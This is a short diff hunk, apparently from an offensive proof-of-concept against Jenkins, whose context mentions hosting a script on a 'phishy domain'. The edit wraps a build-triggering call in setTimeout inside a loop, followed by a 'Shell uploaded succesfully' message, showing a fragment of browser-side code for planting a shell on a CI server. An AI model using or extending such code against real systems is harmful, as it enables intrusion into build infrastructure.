@@ -61,7 +61,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           //executors = getExecutors(host)
           //alert(executors)
           for(i=0; i< 10; i++){
-            rubBuild(name,host);
+            setTimeout(rubBuild(name,host), 1000);
           }
           document.getElementById("result").innerHTML = "Shell uploaded succesfully";
         }
